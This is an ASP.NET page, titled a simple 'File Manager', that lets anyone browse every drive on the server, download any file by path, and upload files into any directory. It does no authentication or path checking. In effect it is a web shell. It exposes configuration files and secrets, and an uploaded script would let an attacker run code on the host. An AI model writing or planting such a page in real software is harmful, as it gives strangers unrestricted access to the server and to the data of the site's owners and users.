<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string dir = Request.QueryString["dir"];
        if (string.IsNullOrEmpty(dir))
        {
            // Show drives
            DriveInfo[] drives = DriveInfo.GetDrives();
            Response.Write("<ul>");
            foreach (DriveInfo drive in drives)
            {
                if (drive.IsReady)
                {
                    Response.Write("<li class='dir'>[DRIVE] <a href='?dir=" + 
                        HttpUtility.UrlEncode(drive.RootDirectory.FullName) + 
                        "'>" + drive.Name + "</a></li>");
                }
            }
            Response.Write("</ul>");
        }
        else
        {
            // Show folders and files
            DirectoryInfo di = new DirectoryInfo(dir);
            Response.Write("<h3>Current directory: " + HttpUtility.HtmlEncode(di.FullName) + "</h3>");
            Response.Write("<ul>");

            // Parent folder link
            if (di.Parent != null)
            {
                Response.Write("<li class='dir'>[PARENT] <a href='?dir=" +
                    HttpUtility.UrlEncode(di.Parent.FullName) + "'>..</a></li>");
            }

            // Folders
            foreach (DirectoryInfo sub in di.GetDirectories())
            {
                Response.Write("<li class='dir'>[DIR] <a href='?dir=" +
                    HttpUtility.UrlEncode(sub.FullName) + "'>" + HttpUtility.HtmlEncode(sub.Name) + "</a></li>");
            }

            // Files
            foreach (FileInfo fi in di.GetFiles())
            {
                Response.Write("<li class='file'>[FILE] <a href='?download=" +
                    HttpUtility.UrlEncode(fi.FullName) + "'>" + HttpUtility.HtmlEncode(fi.Name) + "</a></li>");
            }
            Response.Write("</ul>");

            // Upload form
            Response.Write("<h3>Upload file</h3>");
            Response.Write("<form method='post' enctype='multipart/form-data'>");
            Response.Write("<input type='file' name='file' />");
            Response.Write("<input type='submit' value='Upload' />");
            Response.Write("</form>");

            // Handle upload
            if (IsPostBack && Request.Files.Count > 0)
            {
                HttpPostedFile uploaded = Request.Files[0];
                string savePath = Path.Combine(di.FullName, Path.GetFileName(uploaded.FileName));
                uploaded.SaveAs(savePath);
                Response.Write("<p style='color:green;'>File uploaded: " + HttpUtility.HtmlEncode(savePath) + "</p>");
            }

            // Handle download
            string download = Request.QueryString["download"];
            if (!string.IsNullOrEmpty(download) && File.Exists(download))
            {
                Response.Clear();
                Response.ContentType = "application/octet-stream";
                Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(download));
                Response.WriteFile(download);
                Response.End();
            }
        }
    }
</script>

<html>
<head>
<style>
    body { font-family: Arial; background: #f7f7f7; }
    ul { list-style: none; padding-left: 0; }
    li.dir { color: #2a52be; }
    li.file { color: #000; }
    a { text-decoration: none; }
    a:hover { text-decoration: underline; }
</style>
</head>
<body>
<h2>ASP.NET 4.0 File Manager</h2>
</body>
</html>
